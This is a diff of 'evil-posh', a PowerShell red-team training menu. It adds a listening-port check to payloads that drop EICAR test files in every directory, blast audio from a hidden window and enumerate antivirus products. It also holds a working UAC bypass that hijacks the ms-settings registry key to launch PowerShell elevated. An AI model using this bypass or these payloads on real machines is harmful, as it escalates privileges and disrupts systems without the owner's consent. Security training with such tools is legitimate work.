@@ -9,6 +9,17 @@ $global:PayloadChoice = "None"
 $global:Output = "Ready"
 $global:AvCheckResult = $AntiVirusNames
 
+$PortCheck = {
+    $TCPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()            
+    $Connections = $TCPProperties.GetActiveTcpListeners()            
+    foreach($Connection in $Connections) {            
+        if($Connection.address.AddressFamily -eq "InterNetwork" ) { $IPType = "IPv4" } else { $IPType = "IPv6" }            
+        $OutputObj = New-Object -TypeName PSobject            
+        $OutputObj | Add-Member -MemberType NoteProperty -Name "ListeningPort" -Value $Connection.Port            
+    }
+    $global:Output = $OutputObj
+}
+
 $AVCheck = {
     $wmiQuery = "SELECT * FROM AntiVirusProduct"    
     $AntivirusProduct = Get-WmiObject -Namespace "root\SecurityCenter2" -Query $wmiQuery       
@@ -25,7 +36,8 @@ $nuke = {
     $enum = Get-ChildItem -Recurse -Directory $global:Path
     foreach($dir in $enum){
         $a++
-        $name = Get-Random
+        $random = Get-Random
+        $name = "$($random).POSH"
         [string] $EncodedEicar = 'WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo='
         [byte[]] $EicarBytes = [System.Convert]::FromBase64String($EncodedEicar)
         [string] $Eicar = [System.Text.Encoding]::UTF8.GetString($EicarBytes)
@@ -73,28 +85,34 @@ Function Show-Menu {
     $jollyroger = "`n888888888888888888888888888888888888888888888888888888888888`n888888888888888888888888888888888888888888 github:rcreecy 88`n8888888888888888888888888P`"`"  `"`"9888888888888888888888888888`n8888888888888888P`"88888P          988888`"9888888888888888888`n8888888888888888  `"9888            888P`"  888888888888888888`n888888888888888888bo `"9  d8o  o8b  P`" od88888888888888888888`n888888888888888888888bob 98`"  `"8P dod88888888888888888888888`n888888888888888888888888    db    88888888888888888888888888`n88888888888888888888888888      8888888888888888888888888888`n88888888888888888888888P`"9bo  odP`"98888888888888888888888888`n88888888888888888888P`" od88888888bo `"98888888888888888888888`n888888888888888888   d88888888888888b   88888888888888888888`n8888888888888888888oo8888888888888888oo888888888888888888888`n888888888888888888888888888888888888888888888888888888888888"
     Write-Host $jollyroger
     Write-Ascii "evil-posh"
-    Write-Host "Training scenario powershell execution examples`n"
+    Write-Host "`n*Mostly* benign powershell examples for training on potentially malicious capabilties`n"
     Write-Host "PATH: $($global:Path)"
     Write-Host "PAYLOAD: $($global:PayloadChoice)"
     Write-Host "OUTPUT: $($global:Output)"
-    Write-Host "`n====================== $Title ======================="
-    Write-Host "BYPASS - Attempt to launch tool as administrator without UAC prompt"
+    Write-Host "`n========================== $Title ==========================="
     Write-Host "PATH - Set main path to execute directory based payloads against (Defaults to 'C:\')"
-    Write-Host "PAYLOAD - Set payload type"
+    Write-Host "TOOLS - Set your payload or leverage a utility function"
+    Write-Host "PERSIST - Choose your persistence mechanism [TODO]"
+    Write-Host "BYPASS - Attempt to launch powershell as administrator without UAC prompt"
     Write-Host "EXECUTE - Run the combination of parameters set"
-    Write-Host "PERSIST - Choose your persistence mechanism"
-    Write-Host "EXIT" 
+    Write-Host "EXIT`n" 
 }
 
 Function Set-Path{
     $global:Path = Read-Host -Prompt "PATH"
-    Clear-Host
-    $global:Output = "PATH set to $($global:Path)"
-    Clear-Host
+    $PathValidation = Test-Path $global:Path
+    if($PathValidation) {
+        Clear-Host
+        $global:Output = "PATH set to $($global:Path)"
+        Clear-Host
+    } else {
+        Write-Host "Invalid path."
+        Set-Path
+    }  
 }
 
 Function Set-Payload{
-    Write-Host `n"PAYLOAD OPTIONS:`nENUM - List out directories and subdirectories from the base (PATH)`nNUKE - Drop an EICAR file in every directory and subdirectory from base (PATH)`nWHALE - Set system volum to MAX and play Narwhales 10 hour in a hidden window`nAVCHECK - Check presence of current AV on system"
+    Write-Host `n"PAYLOAD OPTIONS:`n NUKE - Drop an EICAR file in every directory and subdirectory from base (PATH)`n WHALE - Set system volum to MAX and play Narwhales 10 hour in a hidden window`n`nTOOLS:`n AVCHECK - Check presence of current AV on system`n ENUM - List out directories and subdirectories from the base (PATH)`n PORTS - Run a check on listening ports on the machine`n`nBACK"
     $global:PayloadChoice = Read-Host "`nCHOICE"
     if($global:PayloadChoice -eq 'ENUM'){
         $global:Payload = 1
@@ -107,8 +125,11 @@ Function Set-Payload{
         $global:Payload = 3
     } elseif($global:PayloadChoice -eq 'AVCHECK'){
         $global:Payload=4
+    } elseif($global:PayloadChoice -eq 'PORTS'){
+        $global:Payload=5
+    } elseif($global:PayloadChoice -eq 'BACK'){
+        return
     } else {
-        Write-Host "Not a valid option"
         return
     }
     Clear-Host
@@ -126,6 +147,8 @@ Function Start-Payload{
         Invoke-Command -ScriptBlock $whale
     } elseif($global:Payload -eq 4){
         Invoke-Command -Scriptblock $AVCheck
+    } elseif($global:Payload -eq 5){
+        Invoke-Command -ScriptBlock $PortCheck
     } else {
         Clear-Host
         $global:Output = "An invalid option was provided!"
@@ -135,8 +158,19 @@ Function Start-Payload{
 }
 
 Function Start-Bypass{
+    $ShellChoice = Read-Host "Launch into evil-posh? (y/n)"
     Clear-Host
-    [String]$program = "cmd /c start powershell.exe -noprofile $($PSCommandPath)"
+    if($ShellChoice -eq 'y'){
+        [String]$program = "cmd /c start powershell.exe -noprofile $($PSCommandPath)"
+    } elseif($ShellChoice -eq 'n'){
+        [String]$program = "cmd /c start powershell.exe -noprofile"
+    } elseif($ShellChoice -eq 'BACK'){
+        Clear-Host
+        return
+    } else {
+        Write-Host "Not valid input"
+        Start-Bypass
+    }
     New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
     New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
     Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
@@ -153,7 +187,7 @@ do{
         'PATH' {
             Set-Path
         }
-        'PAYLOAD' {
+        'TOOLS' {
             Set-Payload
         }
         'EXECUTE' {
